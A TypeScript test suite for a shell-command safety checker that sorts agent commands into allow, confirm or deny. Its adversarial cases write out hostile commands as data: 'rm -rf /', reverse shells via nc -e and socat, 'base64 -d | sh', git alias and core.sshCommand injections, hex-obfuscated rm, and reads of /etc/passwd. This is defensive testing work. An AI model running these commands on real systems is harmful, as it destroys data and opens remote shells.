import { test } from 'node:test';
import assert from 'node:assert/strict';

import {
  assessShellCommand,
  type AssessShellOptions,
  type ShellAssessment,
  type ShellDialect,
} from './shell.ts';

const CWD = '/work/repo';

function assess(
  command: string,
  overrides: Partial<AssessShellOptions> = {},
): ShellAssessment {
  return assessShellCommand(command, { cwd: CWD, ...overrides });
}

function assertOutcome(
  command: string,
  kind: ShellAssessment['kind'],
  verdict: ShellAssessment['verdict'],
  reason: ShellAssessment['reason'],
  overrides: Partial<AssessShellOptions> = {},
): ShellAssessment {
  const result = assess(command, overrides);
  assert.equal(result.kind, kind, `kind for ${JSON.stringify(command)}`);
  assert.equal(result.verdict, verdict, `verdict for ${JSON.stringify(command)}`);
  assert.equal(result.reason, reason, `reason for ${JSON.stringify(command)}`);
  return result;
}

test('safe workflow catalog is the only allow path', () => {
  const safe = [
    'git status',
    'git status --short --branch',
    'git status --porcelain=v2',
    'git diff',
    'git diff --stat HEAD',
    'git log',
    'git log --oneline -n 5',
    'git log -5 --graph',
    'npm run typecheck',
    'npm test',
    'npm run build',
    '/usr/bin/git status',
    '/usr/local/bin/npm test',
  ];

  for (const command of safe) {
    const result = assertOutcome(
      command,
      'plan',
      'allow',
      'safe_workflow_command',
    );
    assert.ok(result.operations.length > 0, command);
    for (const operation of result.operations) {
      assert.equal(operation.verdict, 'allow', command);
      assert.equal(operation.reason, 'safe_workflow_command', command);
    }
  }
});

test('safe git commands reject write or execution arguments', () => {
  assertOutcome('git status --bogus', 'plan', 'confirm', 'unlisted_arguments');
  assertOutcome('git diff --ext-diff', 'plan', 'confirm', 'unlisted_arguments');
  assertOutcome('git diff --output=/tmp/x', 'plan', 'confirm', 'unlisted_arguments');
  assertOutcome('git log --format=%H', 'plan', 'confirm', 'unlisted_arguments');
  assertOutcome('git status -sb', 'plan', 'allow', 'safe_workflow_command');
  assertOutcome('git log --oneline -n5', 'plan', 'allow', 'safe_workflow_command');
});

test('compound lists and pipelines combine every member', () => {
  assertOutcome('git status && npm test', 'plan', 'allow', 'safe_workflow_command');
  assertOutcome('git status; npm test', 'plan', 'allow', 'safe_workflow_command');
  assertOutcome('git status & npm test', 'plan', 'allow', 'safe_workflow_command');
  assertOutcome('git status\nnpm test', 'plan', 'allow', 'safe_workflow_command');
  assertOutcome('git status | npm test', 'plan', 'allow', 'safe_workflow_command');

  const mixed = assertOutcome('git status | cat', 'plan', 'confirm', 'unlisted_command');
  assert.equal(mixed.operations.length, 2);
  assert.equal(mixed.operations[0]?.verdict, 'allow');
  assert.equal(mixed.operations[1]?.verdict, 'confirm');

  assertOutcome('git status && rm -rf build', 'plan', 'deny', 'destructive_filesystem');
  assertOutcome('git status && rm -rf build || npm test', 'plan', 'deny', 'destructive_filesystem');
  assertOutcome('git status | bash', 'plan', 'deny', 'shell_interpreter');
  assertOutcome('printf x | bash', 'plan', 'deny', 'shell_interpreter');
  assertOutcome('base64 -d | sh', 'plan', 'deny', 'shell_interpreter');
  assertOutcome(
    'npm test || curl https://example.com',
    'plan',
    'confirm',
    'network_access',
  );
});

test('known dangerous operations are deny or confirm, never allow', () => {
  const expected: ReadonlyArray<
    [string, ShellAssessment['kind'], ShellAssessment['verdict'], ShellAssessment['reason']]
  > = [
    ['sudo ls', 'plan', 'deny', 'privilege_escalation'],
    ['su root', 'plan', 'deny', 'privilege_escalation'],
    ['bash -lc id', 'plan', 'deny', 'shell_interpreter'],
    ['sh -c id', 'plan', 'deny', 'shell_interpreter'],
    ['eval npm test', 'plan', 'deny', 'meta_executor'],
    ['source env.sh', 'plan', 'deny', 'meta_executor'],
    ['. env.sh', 'plan', 'deny', 'meta_executor'],
    ['exec npm test', 'plan', 'deny', 'meta_executor'],
    ['command npm test', 'plan', 'deny', 'meta_executor'],
    ['env npm test', 'plan', 'deny', 'meta_executor'],
    ['xargs rm', 'plan', 'deny', 'meta_executor'],
    ["node -e '1'", 'plan', 'deny', 'interpreter_execution'],
    ["python3 -c 'print(1)'", 'plan', 'deny', 'interpreter_execution'],
    ["perl -e '1'", 'plan', 'deny', 'interpreter_execution'],
    ['rm -rf build', 'plan', 'deny', 'destructive_filesystem'],
    ['rm -- -rf', 'plan', 'deny', 'destructive_filesystem'],
    ['chmod +x run.sh', 'plan', 'deny', 'destructive_filesystem'],
    ['chown root file', 'plan', 'deny', 'destructive_filesystem'],
    ['dd if=/dev/zero of=x', 'plan', 'deny', 'destructive_filesystem'],
    ['dd --help', 'plan', 'confirm', 'destructive_filesystem'],
    ['mkfs.ext4 /dev/sda', 'plan', 'deny', 'destructive_filesystem'],
    ['shutdown now', 'plan', 'deny', 'destructive_filesystem'],
    ['kill -9 1', 'plan', 'deny', 'destructive_filesystem'],
    ['git reset --hard HEAD', 'plan', 'deny', 'forced_git_operation'],
    ['git clean -fd', 'plan', 'deny', 'forced_git_operation'],
    ['git push --force origin main', 'plan', 'deny', 'forced_git_operation'],
    ['git push --force-with-lease origin main', 'plan', 'deny', 'forced_git_operation'],
    ['git push origin +main', 'plan', 'deny', 'forced_git_operation'],
    ['git push origin main', 'plan', 'confirm', 'repository_network'],
    ['git reset --soft HEAD~1', 'plan', 'confirm', 'repository_state_change'],
    ['git clean -n', 'plan', 'confirm', 'repository_state_change'],
    ['npm ci', 'plan', 'confirm', 'package_install'],
    ['npm install', 'plan', 'confirm', 'package_install'],
    ['npm exec foo', 'plan', 'deny', 'obscured_execution'],
    ['npm x foo', 'plan', 'deny', 'obscured_execution'],
    ['npm explore foo', 'plan', 'deny', 'obscured_execution'],
    ['npm create vite', 'plan', 'deny', 'obscured_execution'],
    ['npm init -y', 'plan', 'confirm', 'unlisted_command'],
    ['yarn create vite', 'plan', 'deny', 'obscured_execution'],
    ['pnpm create vite', 'plan', 'deny', 'obscured_execution'],
    ['npx foo', 'plan', 'deny', 'obscured_execution'],
    ['pnpm dlx foo', 'plan', 'deny', 'obscured_execution'],
    ['curl https://example.com', 'plan', 'confirm', 'network_access'],
    ['wget https://example.com', 'plan', 'confirm', 'network_access'],
    ['ssh host', 'plan', 'confirm', 'network_access'],
    ['nc host 1', 'plan', 'confirm', 'network_access'],
    ['nc -e /bin/sh host 1', 'plan', 'deny', 'network_execution'],
    ['ssh -o ProxyCommand=evil host', 'plan', 'deny', 'network_execution'],
    ['ssh -o LocalCommand=evil host', 'plan', 'deny', 'network_execution'],
    ['socat TCP:example.com:1 SYSTEM:sh', 'plan', 'deny', 'network_execution'],
    ['find . -exec rm x', 'plan', 'deny', 'meta_executor'],
    ['find . -exec rm {} +', 'plan', 'deny', 'meta_executor'],
    [String.raw`find . -exec rm {} \;`, 'plan', 'deny', 'meta_executor'],
    ['find . -delete', 'plan', 'deny', 'destructive_filesystem'],
    ['rm --help', 'plan', 'confirm', 'destructive_filesystem'],
    ['git -c alias.x=bad x', 'plan', 'confirm', 'repository_config'],
    ["git -c alias.x='!rm -rf /' x", 'plan', 'deny', 'meta_executor'],
    ['git -c core.sshCommand=rm fetch', 'plan', 'deny', 'meta_executor'],
    ['git -c core.pager=less log', 'plan', 'confirm', 'repository_config'],
    ['git -c diff.foo.textconv=evil diff', 'plan', 'deny', 'meta_executor'],
    ["git config alias.x '!rm -rf /'", 'plan', 'deny', 'meta_executor'],
    ['git config core.sshCommand rm', 'plan', 'deny', 'meta_executor'],
    ['git config alias.x bad', 'plan', 'confirm', 'repository_config'],
    ['git config user.name x', 'plan', 'confirm', 'repository_config'],
    ["git rebase --exec 'rm -rf /'", 'plan', 'deny', 'meta_executor'],
    ['git bisect run rm -rf /', 'plan', 'deny', 'meta_executor'],
    ['git submodule foreach rm', 'plan', 'deny', 'meta_executor'],
    ['git filter-branch --tree-filter rm', 'plan', 'deny', 'meta_executor'],
    ['git difftool --extcmd rm', 'plan', 'deny', 'meta_executor'],
    ['git -C /tmp status', 'plan', 'confirm', 'repository_config'],
    ['npm test -- --watch', 'plan', 'confirm', 'unlisted_arguments'],
    ['npm run dev', 'plan', 'confirm', 'unlisted_arguments'],
  ];

  for (const [command, kind, verdict, reason] of expected) {
    assertOutcome(command, kind, verdict, reason);
  }
});

test('redirect targets are normalized and gated by cwd containment', () => {
  const inside = assertOutcome(
    'npm test > out.log',
    'plan',
    'confirm',
    'redirect_inside_workspace',
  );
  assert.deepEqual(inside.operations[0]?.targets, ['/work/repo/out.log']);
  assert.equal(inside.operations[0]?.effect, 'write');

  const normalized = assertOutcome(
    'npm test >> ./sub/../out.log',
    'plan',
    'confirm',
    'redirect_inside_workspace',
  );
  assert.deepEqual(normalized.operations[0]?.targets, ['/work/repo/out.log']);

  assertOutcome('npm test 2> errors.log', 'plan', 'confirm', 'redirect_inside_workspace');
  assertOutcome('npm test &> all.log', 'plan', 'confirm', 'redirect_inside_workspace');
  assertOutcome('npm test &>> all.log', 'plan', 'confirm', 'redirect_inside_workspace');
  assertOutcome('npm test < input.txt', 'plan', 'confirm', 'redirect_inside_workspace');

  const outside = assertOutcome(
    'npm test > /tmp/out.log',
    'plan',
    'deny',
    'redirect_outside_workspace',
  );
  assert.deepEqual(outside.operations[0]?.targets, ['/tmp/out.log']);

  const parent = assertOutcome(
    'npm test > ../out.log',
    'plan',
    'deny',
    'redirect_outside_workspace',
  );
  assert.deepEqual(parent.operations[0]?.targets, ['/work/out.log']);

  assertOutcome('npm test > ../../etc/passwd', 'plan', 'deny', 'redirect_outside_workspace');
  assertOutcome('npm test > /dev/null', 'plan', 'deny', 'redirect_outside_workspace');
  assertOutcome('npm test < /etc/passwd', 'plan', 'deny', 'redirect_outside_workspace');
  assertOutcome('npm test > /work/repo2/out.log', 'plan', 'deny', 'redirect_outside_workspace');

  assertOutcome('npm test 2>&1', 'opaque', 'confirm', 'opaque_redirect');
  assertOutcome('npm test >', 'opaque', 'confirm', 'opaque_redirect');
  assertOutcome('npm test > > out', 'opaque', 'confirm', 'opaque_redirect');
  assertOutcome('npm test 3> out', 'opaque', 'confirm', 'opaque_redirect');
  assertOutcome('npm test 1< out', 'opaque', 'confirm', 'opaque_redirect');
  assertOutcome('npm test > $FILE', 'opaque', 'confirm', 'opaque_expansion');
});

test('custom command prefix, shell path, and dialects fail closed', () => {
  const prefixed = assertOutcome(
    'git status',
    'opaque',
    'confirm',
    'custom_command_prefix',
    { commandPrefix: 'cd /work/repo &&' },
  );
  assert.equal(prefixed.operations.length, 0);

  assertOutcome('git status', 'plan', 'allow', 'safe_workflow_command', {
    commandPrefix: '',
  });
  assertOutcome('git status', 'plan', 'allow', 'safe_workflow_command', {
    shellPath: '/bin/bash',
  });
  assertOutcome('git status', 'plan', 'allow', 'safe_workflow_command', {
    shellPath: '/usr/bin/sh',
  });
  assertOutcome('git status', 'opaque', 'confirm', 'custom_shell', {
    shellPath: '/bin/zsh',
  });
  assertOutcome('git status', 'unsupported', 'confirm', 'unsupported_dialect', {
    shellPath: '/usr/bin/pwsh',
  });
  assertOutcome('git status', 'unsupported', 'confirm', 'unsupported_dialect', {
    dialect: 'powershell',
  });
  assertOutcome('npm test', 'unsupported', 'confirm', 'unsupported_dialect', {
    dialect: 'cmd' as unknown as ShellDialect,
  });
});

test('invalid input fails closed without throwing', () => {
  assertOutcome('git status', 'opaque', 'confirm', 'invalid_input', {
    cwd: 'relative/path',
  });
  assertOutcome('git status', 'opaque', 'confirm', 'invalid_input', {
    cwd: '/work/\0repo',
  });
  assertOutcome('git status', 'opaque', 'confirm', 'invalid_input', {
    commandPrefix: 5 as unknown as string,
  });
  assertOutcome('git status', 'opaque', 'confirm', 'invalid_input', {
    shellPath: 5 as unknown as string,
  });

  const nullOptions = assessShellCommand(
    'git status',
    null as unknown as AssessShellOptions,
  );
  assert.equal(nullOptions.kind, 'opaque');
  assert.equal(nullOptions.verdict, 'confirm');
  assert.equal(nullOptions.reason, 'invalid_input');

  const nullCommand = assessShellCommand(
    null as unknown as string,
    { cwd: CWD },
  );
  assert.equal(nullCommand.kind, 'opaque');
  assert.equal(nullCommand.verdict, 'confirm');
  assert.equal(nullCommand.reason, 'invalid_input');
});

test('unlisted executables are confirm and never allow', () => {
  assertOutcome('custom-script --flag', 'plan', 'confirm', 'unlisted_command');
  assertOutcome('cat file.txt', 'plan', 'confirm', 'unlisted_command');
  assertOutcome('echo hello', 'plan', 'confirm', 'unlisted_command');
  assertOutcome('make', 'plan', 'confirm', 'unlisted_command');
  assertOutcome('npm', 'plan', 'confirm', 'unlisted_command');
  assertOutcome('git', 'plan', 'confirm', 'unlisted_command');
  assertOutcome('find . -name x', 'plan', 'confirm', 'unlisted_command');

  const relativeGit = assertOutcome(
    './git status',
    'plan',
    'confirm',
    'untrusted_executable_path',
  );
  assert.equal(relativeGit.operations[0]?.program, 'git');

  assertOutcome('/tmp/git status', 'plan', 'confirm', 'untrusted_executable_path');
  assertOutcome('/usr/bin/custom-tool', 'plan', 'confirm', 'unlisted_command');
});

test('adversarial corpus stays opaque or explicitly denied', () => {
  const expected: ReadonlyArray<
    [string, ShellAssessment['kind'], ShellAssessment['verdict'], ShellAssessment['reason']]
  > = [
    [String.raw`$'\x72\x6d' -rf /`, 'opaque', 'confirm', 'opaque_expansion'],
    ['"$(rm -rf /)"', 'opaque', 'confirm', 'opaque_expansion'],
    ['`rm -rf /`', 'opaque', 'confirm', 'opaque_substitution'],
    ['npm test `rm -rf /`', 'opaque', 'confirm', 'opaque_substitution'],
    ['npm test $(rm -rf /)', 'opaque', 'confirm', 'opaque_expansion'],
    ["echo '$HOME'", 'opaque', 'confirm', 'opaque_expansion'],
    ["echo '`date`'", 'opaque', 'confirm', 'opaque_substitution'],
    [String.raw`r\m -rf /`, 'plan', 'deny', 'destructive_filesystem'],
    ["'rm' -rf /", 'plan', 'deny', 'destructive_filesystem'],
    [String.raw`e\val npm test`, 'plan', 'deny', 'meta_executor'],
    ['env rm -rf /', 'plan', 'deny', 'meta_executor'],
    ['command rm x', 'plan', 'deny', 'meta_executor'],
    ['find . -exec rm x', 'plan', 'deny', 'meta_executor'],
    ['xargs rm', 'plan', 'deny', 'meta_executor'],
    ["git -c alias.x='!rm -rf /' x", 'plan', 'deny', 'meta_executor'],
    ['git -C /tmp status', 'plan', 'confirm', 'repository_config'],
    ['cat <<EOF\nx\nEOF', 'opaque', 'confirm', 'opaque_heredoc'],
    ['cat <<< x', 'opaque', 'confirm', 'opaque_heredoc'],
    ['npm test *', 'opaque', 'confirm', 'opaque_glob'],
    ['npm test ?', 'opaque', 'confirm', 'opaque_glob'],
    ['npm test {a,b}', 'opaque', 'confirm', 'opaque_brace'],
    ['npm test [a]', 'opaque', 'confirm', 'opaque_compound'],
    ['npm test ~', 'opaque', 'confirm', 'opaque_expansion'],
    ['npm test !x', 'opaque', 'confirm', 'opaque_expansion'],
    ['npm test\r\n', 'opaque', 'confirm', 'opaque_control_character'],
    ['npm test\0', 'opaque', 'confirm', 'opaque_control_character'],
    ['npm test \\\0', 'opaque', 'confirm', 'opaque_control_character'],
    ['(((npm test)))', 'opaque', 'confirm', 'opaque_compound'],
    ['if true; then npm test; fi', 'opaque', 'confirm', 'opaque_compound'],
    ['for f in x; do npm test; done', 'opaque', 'confirm', 'opaque_compound'],
    ['while true; do npm test; done', 'opaque', 'confirm', 'opaque_compound'],
    ['npm test "x', 'opaque', 'confirm', 'unbalanced_quote'],
    ['npm test &&', 'opaque', 'confirm', 'trailing_operator'],
    ['npm test |', 'opaque', 'confirm', 'trailing_operator'],
    ['npm test &', 'opaque', 'confirm', 'trailing_operator'],
    ['npm test;', 'opaque', 'confirm', 'trailing_operator'],
    ['; npm test', 'opaque', 'confirm', 'trailing_operator'],
    ['| npm test', 'opaque', 'confirm', 'trailing_operator'],
    ['FOO=bar npm test', 'opaque', 'confirm', 'opaque_assignment'],
    ['cd /; npm test', 'opaque', 'confirm', 'opaque_directory_change'],
    ['npm test && cd /', 'opaque', 'confirm', 'opaque_directory_change'],
    ['npm test # comment', 'opaque', 'confirm', 'opaque_comment'],
    ['npm test 2>&1', 'opaque', 'confirm', 'opaque_redirect'],
    ['npm test <(x)', 'opaque', 'confirm', 'opaque_process_substitution'],
    ['npm test >(x)', 'opaque', 'confirm', 'opaque_process_substitution'],
  ];

  for (const [command, kind, verdict, reason] of expected) {
    assertOutcome(command, kind, verdict, reason);
  }
});

test('command, word, and subcommand limits are opaque', () => {
  assertOutcome('npm test ' + 'a'.repeat(70_000), 'opaque', 'confirm', 'limits_exceeded');
  assertOutcome(
    'git status ' + Array.from({ length: 300 }, () => 'a').join(' '),
    'opaque',
    'confirm',
    'limits_exceeded',
  );
  assertOutcome(
    Array.from({ length: 40 }, () => 'npm test').join('; '),
    'opaque',
    'confirm',
    'limits_exceeded',
  );
});

test('empty commands, trailing newlines, and newline continuation', () => {
  assertOutcome('', 'opaque', 'confirm', 'empty_command');
  assertOutcome('   ', 'opaque', 'confirm', 'empty_command');
  assertOutcome('\n\n', 'opaque', 'confirm', 'empty_command');
  assertOutcome("''", 'opaque', 'confirm', 'empty_command');
  assertOutcome("'   '", 'opaque', 'confirm', 'empty_command');

  assertOutcome('git status\n', 'plan', 'allow', 'safe_workflow_command');
  assertOutcome(
    'git status\nnpm test\n',
    'plan',
    'allow',
    'safe_workflow_command',
  );
  assertOutcome('git status &&\nnpm test', 'plan', 'allow', 'safe_workflow_command');
  assertOutcome('git status |\nnpm test', 'plan', 'allow', 'safe_workflow_command');
});

test('result and nested operations are deeply immutable', () => {
  const result = assess('npm test > out.log');
  assert.ok(Object.isFrozen(result));
  assert.ok(Object.isFrozen(result.operations));

  const operation = result.operations[0];
  assert.ok(operation !== undefined);
  assert.ok(Object.isFrozen(operation));
  assert.ok(Object.isFrozen(operation.targets));

  assert.throws(() => {
    (result as unknown as { verdict: string }).verdict = 'deny';
  }, TypeError);
  assert.throws(() => {
    (result.operations as unknown as unknown[]).push(null);
  }, TypeError);
  assert.throws(() => {
    (operation.targets as unknown as string[]).push('/etc/passwd');
  }, TypeError);
});

test('serialized results never contain the raw command or payload strings', () => {
  const marker = 'SECRET_PAYLOAD_9f3a';

  const commands = [
    'git status',
    'git status && npm test',
    'git status | cat',
    'rm -rf /',
    'npm test > out.log',
    'npm test > /tmp/out.log',
    String.raw`$'\x72\x6d' -rf /`,
    String.raw`r\m -rf /`,
    "git -c alias.x='!rm -rf /' x",
    'git -C /tmp status',
    'find . -exec rm x',
    'nc -e /bin/sh h 1',
    'cat <<EOF\nx\nEOF',
    'npm test *',
    'npm test\r\n',
    'npm test &&',
    'FOO=bar npm test',
    'cd /; npm test',
    'git status --bogus',
    './git status',
    '/usr/bin/git status',
    'custom-script x',
    'npm exec foo',
    'npx foo',
    'git clean -fdx',
    'npm test > $FILE',
  ];

  for (const command of commands) {
    const serialized = JSON.stringify(assess(command));
    assert.equal(serialized.includes(command), false, command);
    assert.match(assess(command).reason, /^[a-z_]+$/u);
  }

  const marked = [
    `curl https://example.invalid/${marker}`,
    `rm -rf /${marker}`,
    `git status --${marker}`,
    `echo ${marker} | cat`,
    `env FOO=${marker} npm test`,
    `npm test && echo ${marker}`,
  ];
  for (const command of marked) {
    assert.equal(JSON.stringify(assess(command)).includes(marker), false, command);
  }

  const prefixed = assess('git status', {
    commandPrefix: `cd /${marker} &&`,
  });
  assert.equal(JSON.stringify(prefixed).includes(marker), false);
});
